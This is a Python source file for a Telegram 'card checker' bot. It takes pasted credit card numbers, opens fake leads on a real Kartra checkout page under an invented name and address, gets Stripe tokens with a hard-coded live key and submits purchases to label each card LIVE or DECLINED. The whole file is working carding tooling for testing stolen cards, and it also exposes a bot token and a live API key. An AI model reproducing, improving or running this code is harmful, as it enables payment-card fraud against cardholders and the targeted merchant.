import telebot
import requests
import random
import string
import time

BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_51Jhet4HYghhmd4CamObYqu2qaPmZlp3SqgYcBfUbKrgBBnS040UHuHvzuHxl7I4GQwFXEwjAx62BQu01Q76BRmum00dZ72P1K2"
STRIPE_URL = "https://api.stripe.com/v1/tokens"
SIGNUP_URL = "https://kymtolson.kartra.com/checkout/createCheckoutLeadFirstStep/"
FINAL_URL = "https://kymtolson.kartra.com/checkout/purchase_product/"

def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvc = map(str.strip, parts)
    if not (cc.isdigit() and mm.isdigit() and cvc.isdigit() and (len(yy) in [2,4])):
        return None
    if len(yy) == 2:
        yy = "20" + yy
    return cc, mm.zfill(2), yy, cvc

def signup_lead(email):
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://kymtolson.kartra.com",
        "referer": "https://kymtolson.kartra.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "payment_data": "3c2ef539ad3c02128b58e3e27d6031b9d9d8d87c34503569cad8e3c2ab7a8ae3df5e923dffadd5206fcd8d12f3085b9ccf6085d532f63a5a998682a7da34ea63AEqm9/...",  # Use your real value here!
        "first_name": "Peshang",
        "last_name": "Salam",
        "email": email,
        "address": "198 White Horse Pike",
        "city": "West Collingswood",
        "zip": "08107",
        "sales_tax_percent": "0",
        "country": "USA",
        "state": "18650",
        "gdpr_terms": "1",
        "requestId": str(int(time.time() * 1000)) + ".H4pvoL",
        "referrer": "https://clinicalaiclub.com/checkout-free-trial/",
        "kuid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
    }
    # The response is not used for logic, but must be called for signup process
    requests.post(SIGNUP_URL, data=data, headers=headers)

def create_stripe_token(cc, mm, yy, cvc, email):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy[-2:],  # Stripe expects 2-digit year
        "card[cvc]": cvc,
        "card[name]": "Peshang Salam",
        "card[address_line1]": "198 White Horse Pike",
        "card[address_city]": "West Collingswood",
        "card[address_state]": "New Jersey",
        "card[address_zip]": "08107",
        "card[address_country]": "USA",
        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "payment_user_agent": "stripe.js/78ef418",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": STRIPE_PUBLISHABLE_KEY,
        "referrer": "https://kymtolson.kartra.com"
    }
    resp = requests.post(STRIPE_URL, data=data, headers=headers)
    try:
        resp_json = resp.json()
    except Exception as e:
        return None, f"Stripe JSON decode error: {str(e)}"
    token = resp_json.get('id')
    if not token or not token.startswith("tok_"):
        return None, f"Stripe error: {resp_json.get('error', {}).get('message', 'Unknown error')}"
    return token, None

def make_final_request(token, email, cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://kymtolson.kartra.com",
        "referer": "https://kymtolson.kartra.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "kartra_reference_id": "42488fcd-d156-4c64-94ec-1188a5b9de51",
        "payment_data_price_point": "",
        "quantity": "1",
        "quantityAppliedPricePoint": "1",
        "country_vat_popover": "USA",
        "state_vat_popover": "18650",
        "code_price_point": "",
        "coupon_id_price_point": "",
        "coupon_applied_price_point": "0",
        "payment_data": "3c2ef539ad3c02128b58e3e27d6031b9d9d8d87c34503569cad8e3c2ab7a8ae3df5e923dffadd5206fcd8d12f3085b9ccf6085d532f63a5a998682a7da34ea63AEqm9/...",  # Use your real value here!
        "first_name": "Peshang",
        "last_name": "Salam",
        "email": email,
        "address": "198 White Horse Pike",
        "city": "West Collingswood",
        "zip": "08107",
        "sales_tax_percent": "0",
        "country": "USA",
        "state": "18650",
        "gdpr_terms": "1",
        "optionsRadios": "credit_card",
        "card_number": cc[-4:],  # last 4 digits
        "card_exp_month": mm,
        "card_exp_year": yy[-2:],  # last 2 digits
        "CVV": cvc,
        "paypal_email": "",
        "bump_payment_data": "",
        "quantityAppliedBump": "0",
        "selected_price_point": "1",
        "coupon_id": "",
        "coupon_applied": "0",
        "code": "",
        "quantityApplied": "1",
        "verifyBuyerCode": "",
        "stripe_token": token,
        "referrer": "https://clinicalaiclub.com/checkout-free-trial/",
        "kuid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
        # Add any other required fields here!
    }
    resp = requests.post(FINAL_URL, data=data, headers=headers)
    return resp.text

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Kartra/ClinicalAIClub Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "5189410225598146|01|29|022\n"
        "4242424242424242|12|25|123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_line in cards:
        parsed = parse_card_input(card_line)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
            continue
        cc, mm, yy, cvc = parsed
        email = generate_random_email()

        # 1. Signup process (first URL)
        signup_lead(email)

        # 2. Stripe token
        token, err = create_stripe_token(cc, mm, yy, cvc, email)
        if err:
            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
            continue

        # 3. Final purchase request
        final_response = make_final_request(token, email, cc, mm, yy, cvc)
        status = "❌ DECLINED" if "declined" in final_response.lower() else "✅ LIVE"
        bot.send_message(
            message.chat.id,
            f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\nStatus: {status}\n\nFull Response:\n{final_response}"
        )
        time.sleep(10)  # 10 seconds delay between cards

bot.infinity_polling()